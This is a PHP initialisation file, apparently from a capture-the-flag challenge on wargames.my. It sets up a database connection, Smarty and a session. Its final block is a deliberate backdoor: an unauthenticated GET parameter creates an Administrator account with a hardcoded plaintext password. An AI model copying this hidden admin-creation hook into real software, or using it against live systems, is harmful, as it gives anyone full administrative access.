<?php
require_once __DIR__ . '/config.php';

$mysql = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
if ($mysql->connect_error) {
    die('Connect Error (' . $mysql->connect_errno . ') ' . $mysql->connect_error);
}

require_once __DIR__ . '/functions.php';
require_once __DIR__ . '/libs/Smarty.class.php';

$smarty = new Smarty;
$smarty->setCompileDir('/tmp/');

session_start();

if(get('access')) {
	if(get('access') === 'add_dummy_admin') {
		add_admin(
			[
				'user_name' => 'Administrator',
				'user_email' => 'admin@notepad.wargames.my',
				'user_password' => 'Ayamgoreng+!@#'
			]
		);
	}
}